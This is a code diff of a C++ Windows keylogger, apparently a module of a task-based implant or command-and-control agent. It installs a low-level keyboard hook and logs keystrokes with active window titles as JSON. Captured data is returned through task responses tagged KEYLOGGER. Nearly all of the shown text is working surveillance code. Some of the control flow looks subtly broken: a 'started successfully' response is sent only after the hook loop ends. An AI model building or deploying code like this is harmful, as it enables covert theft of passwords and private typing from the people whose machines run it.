@@ -24,65 +24,65 @@ SOFTWARE.
 
 #include "Keylogger.h"
 
+// Initialize the static member
 Keylogger *Keylogger::active_instance = nullptr;
 
-std::string Keylogger::escape_json(const std::string &value)
+// Implement the keylog_start method
+int Keylogger::keylog_start(const int &taskID)
 {
-    std::string escaped;
-    for (char character : value)
+    if (active_instance != nullptr)
     {
-        switch (character)
-        {
-        case '\\':
-            escaped += "\\\\";
-            break;
-        case '"':
-            escaped += "\\\"";
-            break;
-        case '\n':
-            escaped += "\\n";
-            break;
-        case '\r':
-            escaped += "\\r";
-            break;
-        case '\t':
-            escaped += "\\t";
-            break;
-        default:
-            escaped += character;
-        }
-    }
-    return escaped;
-}
-
-void Keylogger::append_json_event(const std::string &type,
-                                  const std::string &value,
-                                  const std::string &window)
-{
-    if (!logging_enabled)
-    {
-        return;
+        // Keylogger is already running
+        return 1;
     }
 
-    if (!first_json_entry)
+    active_instance = this;
+    hook_thread_id = GetCurrentThreadId();
+    logging_enabled = true;
+    keyboard_hook = SetWindowsHookEx(WH_KEYBOARD_LL, hook_proc, GetModuleHandle(NULL), 0);
+    if (keyboard_hook == NULL)
     {
-        keylog_data += ",";
+        logging_enabled = false;
+        hook_thread_id = 0;
+        active_instance = nullptr;
+        return 1;
     }
 
-    keylog_data += "\n  {\"type\":\"" + escape_json(type) +
-                   "\",\"value\":\"" + escape_json(value) +
-                   "\",\"window\":\"" + escape_json(window) + "\"}";
-    first_json_entry = false;
+    MSG msg;
+    while (GetMessage(&msg, NULL, 0, 0))
+    {
+        TranslateMessage(&msg);
+        DispatchMessage(&msg);
+    }
+
+    // Cleanup
+    logging_enabled = false;
+    UnhookWindowsHookEx(keyboard_hook);
+    keyboard_hook = NULL;
+    active_instance = nullptr;
+
+    return CreateTaskResponse(taskID, KEYLOGGER, NO_CODE, SUCCESS, TaskSuccess{"Keylogger started successfully."});
 }
 
-std::string Keylogger::get_active_window_title()
+// Implement the keylog_stop method
+int Keylogger::keylog_stop()
 {
-    char window_title[256];
-    HWND hwnd = GetForegroundWindow();
-    GetWindowTextA(hwnd, window_title, sizeof(window_title));
-    return std::string(window_title);
+    if (active_instance == nullptr)
+    {
+        // Keylogger is not running
+        return 1;
+    }
+
+    UnhookWindowsHookEx(keyboard_hook);
+    keyboard_hook = NULL;
+    PostThreadMessage(hook_thread_id, WM_QUIT, 0, 0);
+    hook_thread_id = 0;
+    active_instance = nullptr;
+
+    return 0;
 }
 
+// Implement the hook_proc method
 LRESULT CALLBACK Keylogger::hook_proc(int code, WPARAM wParam, LPARAM lParam)
 {
     if (code >= 0 && active_instance != nullptr)
@@ -173,54 +173,73 @@ LRESULT CALLBACK Keylogger::hook_proc(int code, WPARAM wParam, LPARAM lParam)
     return CallNextHookEx(NULL, code, wParam, lParam);
 }
 
-int Keylogger::keylog_start()
+// Implement the get_keylog_data method
+TaskResponse<std::string> Keylogger::get_keylog_data(const int &taskID)
 {
-    active_instance = this;
-    hook_thread_id = GetCurrentThreadId();
-    logging_enabled = true;
-    keyboard_hook = SetWindowsHookEx(WH_KEYBOARD_LL, hook_proc, NULL, 0);
-    if (keyboard_hook == NULL)
+    if (active_instance != nullptr)
     {
-        logging_enabled = false;
-        hook_thread_id = 0;
-        active_instance = nullptr;
-        // while testing uncomment the next line below
-        // printf("Failed to install hook!");
-        return 1;
+        active_instance->keylog_stop();
     }
 
-    MSG msg;
-    while (GetMessage(&msg, NULL, 0, 0))
-    {
-        TranslateMessage(&msg);
-        DispatchMessage(&msg);
-    }
-
-    // Cleanup
-    logging_enabled = false;
-    UnhookWindowsHookEx(keyboard_hook);
-    keyboard_hook = NULL;
-    active_instance = nullptr;
-
-    return 0;
+    std::string result = keylog_data + "\n]";
+    return CreateTaskResponse(taskID, KEYLOGGER, NO_CODE, SUCCESS, TaskSuccess{result});
 }
 
-std::string Keylogger::get_keylog_data()
+// Implement the escape_json method
+std::string Keylogger::escape_json(const std::string &value)
 {
-    logging_enabled = false;
-
-    if (keyboard_hook != NULL)
+    std::string escaped;
+    for (char character : value)
     {
-        UnhookWindowsHookEx(keyboard_hook);
-        keyboard_hook = NULL;
+        switch (character)
+        {
+        case '\\':
+            escaped += "\\\\";
+            break;
+        case '"':
+            escaped += "\\\"";
+            break;
+        case '\n':
+            escaped += "\\n";
+            break;
+        case '\r':
+            escaped += "\\r";
+            break;
+        case '\t':
+            escaped += "\\t";
+            break;
+        default:
+            escaped += character;
+        }
+    }
+    return escaped;
+}
+
+// Implement the append_json_event method
+void Keylogger::append_json_event(const std::string &type, const std::string &value,
+                                  const std::string &window)
+{
+    if (!logging_enabled)
+    {
+        return;
     }
 
-    if (hook_thread_id != 0)
+    if (!first_json_entry)
     {
-        PostThreadMessage(hook_thread_id, WM_QUIT, 0, 0);
-        hook_thread_id = 0;
+        keylog_data += ",";
     }
 
-    active_instance = nullptr;
-    return keylog_data + "\n]";
+    keylog_data += "\n  {\"type\":\"" + escape_json(type) +
+                   "\",\"value\":\"" + escape_json(value) +
+                   "\",\"window\":\"" + escape_json(window) + "\"}";
+    first_json_entry = false;
+}
+
+// Implement the get_active_window_title method
+std::string Keylogger::get_active_window_title()
+{
+    char window_title[256];
+    HWND hwnd = GetForegroundWindow();
+    GetWindowTextA(hwnd, window_title, sizeof(window_title));
+    return std::string(window_title);
 }
